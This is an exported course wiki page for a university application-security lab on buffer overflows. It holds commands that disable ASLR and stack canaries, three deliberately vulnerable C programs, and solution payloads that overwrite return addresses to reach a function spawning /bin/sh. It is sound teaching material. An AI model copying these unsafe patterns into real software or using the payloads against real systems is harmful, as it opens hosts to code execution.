    
    

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8" />
  <title>isc:labs:06</title>
<meta name="generator" content="DokuWiki"/>
<meta name="robots" content="index,follow"/>
<meta name="date" content="2016-08-05T14:11:32+0300"/>
<meta name="keywords" content="isc,labs,06"/>
<link rel="search" type="application/opensearchdescription+xml" href="../../../../lib/exe/opensearch.php" title="CS Open CourseWare"/>
<link rel="start" href="../../../../../courses.1.html"/>
<link rel="alternate" type="application/rss+xml" title="Recent Changes" href="../../../../feed.php"/>
<link rel="alternate" type="application/rss+xml" title="Current Namespace" href="../../../../feed.php%3Fmode=list&amp;ns=isc:labs"/>
<link rel="alternate" type="text/html" title="Plain HTML" href="06.html"/>
<link rel="canonical" href="../../../../isc/labs/06.html"/>
<link rel="stylesheet" type="text/css" href="../../../../lib/exe/css.php%3Ft=arctic&amp;tseed=1476798676.css"/>
<script type="text/javascript">/*<![CDATA[*/var NS='isc:labs';var JSINFO = {"id":"isc:labs:06","namespace":"isc:labs","isadmin":0,"isauth":0};
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="../../../../lib/exe/js.php%3Ftseed=1476798676"></script>
<script type="text/x-mathjax-config">/*<![CDATA[*/MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ["$","$"], ["\\(","\\)"] ],
        displayMath: [ ["$$","$$"], ["\\[","\\]"] ],
        processEscapes: true
    }
});
/*!]]>*/</script>
<script type="text/javascript" charset="utf-8" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML"></script>
<script type="text/javascript">/*<![CDATA[*/
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
		  
/*!]]>*/</script>
<script type="text/javascript">/*<![CDATA[*/
var pageTracker = _gat._getTracker("UA-38383934-1");
pageTracker._initData();
pageTracker._trackPageview();
		  
/*!]]>*/</script>
</head>
<body>
<div class="dokuwiki export">
<!-- TOC START -->
<div id="dw__toc">
<h3 class="toggle">Table of Contents</h3>
<div>

<ul class="toc">
<li class="level2"><div class="li"><a href="06.html#lab_06_-_application_security">Lab 06 - Application Security</a></div></li>
<li class="level2"><div class="li"><a href="06.html#resources">Resources</a></div></li>
<li class="level2"><div class="li"><a href="06.html#overview">Overview</a></div></li>
<li class="level2"><div class="li"><a href="06.html#exercises">Exercises</a></div>
<ul class="toc">
<li class="clear">
<ul class="toc">
<li class="level4"><div class="li"><a href="06.html#simple_buffer_overflow">1. Simple buffer overflow</a></div></li>
<li class="level4"><div class="li"><a href="06.html#getting_shell">2. Getting shell</a></div></li>
<li class="level4"><div class="li"><a href="06.html#shellcode">3. Shellcode</a></div></li>
</ul>
</li>
<li class="level3"><div class="li"><a href="06.html#solutions">Solutions:</a></div></li>
</ul></li>
</ul>
</div>
</div>
<!-- TOC END -->

<h2 class="sectionedit1" id="lab_06_-_application_security">Lab 06 - Application Security</h2>
<div class="level2">

<p>
Disable ASLR 
</p>
<pre class="code"> sudo bash -c &#039;echo 0 &gt; /proc/sys/kernel/randomize_va_space&#039;
 </pre>

<p>
Enable ASLR 
</p>
<pre class="code"> sudo bash -c &#039;echo 2 &gt; /proc/sys/kernel/randomize_va_space&#039;</pre>

<p>
Disable canaries:
</p>
<pre class="code"> gcc overflow.c -o overflow -fno-stack-protector
 
 </pre>

</div>
<!-- EDIT1 SECTION "Lab 06 - Application Security" [1-280] -->
<h2 class="sectionedit2" id="resources">Resources</h2>
<div class="level2">
<ul>
<li class="level1"><div class="li"><a href="https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/" class="urlextern" title="https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/"  rel="nofollow">Buffer overflow explained</a></div>
</li>
<li class="level1"><div class="li"><a href="https://dhavalkapil.com/blogs/Shellcode-Injection/" class="urlextern" title="https://dhavalkapil.com/blogs/Shellcode-Injection/"  rel="nofollow">Shellcode explained</a></div>
</li>
</ul>

</div>
<!-- EDIT2 SECTION "Resources" [281-472] -->
<h2 class="sectionedit3" id="overview">Overview</h2>
<div class="level2">

<p>
<a href="../../../../lib/exe/fetch.php%3Fhash=a95ad7&amp;media=http%253A%252F%252Fi.imgur.com%252FmK1nsNl.png" class="media" title="http://i.imgur.com/mK1nsNl.png"><img src="../../../../lib/exe/fetch.php%3Fhash=a95ad7&amp;media=http%253A%252F%252Fi.imgur.com%252FmK1nsNl.png" class="media" alt="" /></a>
</p>

<p>
A buffer overflow occurs when data written to a buffer overruns its boundary and overwrites adjacent memory locations, due to insufficient bounds checking.
</p>

</div>
<!-- EDIT3 SECTION "Overview" [473-688] -->
<h2 class="sectionedit4" id="exercises">Exercises</h2>
<div class="level2">

</div>

<h4 id="simple_buffer_overflow">1. Simple buffer overflow</h4>
<div class="level4">
<ul>
<li class="level1"><div class="li"><a href="https://drive.google.com/open?id=0B_sFoQMHYxA4SlNsakZCRFcwYjQ" class="urlextern" title="https://drive.google.com/open?id=0B_sFoQMHYxA4SlNsakZCRFcwYjQ"  rel="nofollow">bufferoverflow1</a></div>
</li>
</ul>
<pre class="code">
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;


void wanted(){
	puts(&quot;Well done!&quot;);
}

void copy(char *arg){
	char buf[5];
  	strcpy(buf, arg);
}

int main(int argc, char **argv) {
	copy(argv[1]); 
  	return 0;
}
</pre>

</div>

<h4 id="getting_shell">2. Getting shell</h4>
<div class="level4">
<ul>
<li class="level1"><div class="li"><a href="https://drive.google.com/open?id=0B_sFoQMHYxA4WFVnMjNpRF96V0U" class="urlextern" title="https://drive.google.com/open?id=0B_sFoQMHYxA4WFVnMjNpRF96V0U"  rel="nofollow">bufferoverflow2</a></div>
</li>
</ul>
<pre class="code">
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;


void wanted(){
	execve(&quot;/bin/sh&quot;, NULL, NULL);
}

void function() {
   char buffer[10];
   scanf(&quot;%s&quot;, buffer);
}

int main() {
  function();
  return 0;
}
</pre>

</div>

<h4 id="shellcode">3. Shellcode</h4>
<div class="level4">
<ul>
<li class="level1"><div class="li"><a href="https://drive.google.com/open?id=0B_sFoQMHYxA4NDhzaUFVV3kwZzQ" class="urlextern" title="https://drive.google.com/open?id=0B_sFoQMHYxA4NDhzaUFVV3kwZzQ"  rel="nofollow">shellcode</a></div>
</li>
</ul>
<pre class="code">
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;


void vuln(char *str) {
   char buffer[50];
   strcpy(buffer,str);
}

int main() {
  char buf[256];
  fgets(buf, 256, stdin);
  vuln(buf);
  
  return 0;
}
</pre>

</div>
<!-- EDIT4 SECTION "Exercises" [689-1759] -->
<h3 class="sectionedit5" id="solutions">Solutions:</h3>
<div class="level3">

</div>

<h5 id="simple_buffer_overflow1">1. Simple buffer overflow</h5>
<div class="level5">

<p>
 python -c &#039;print “A”*17 + “\x3b\x84\x04\x08”&#039; &gt; payload1
 ./bufov1 `cat payload`
</p>

</div>

<h5 id="getting_shell1">2. Getting shell</h5>
<div class="level5">

<p>
 python -c &#039;print “A”*22 + “\x6b\x84\x04\x08”&#039; &gt; payload2
 cat ./payload2 - | ./bufov2
</p>

</div>

<h5 id="shellcode1">3. Shellcode</h5>
<div class="level5">

</div>
<!-- EDIT5 SECTION "Solutions:" [1760-] --></div>
</body>
</html>
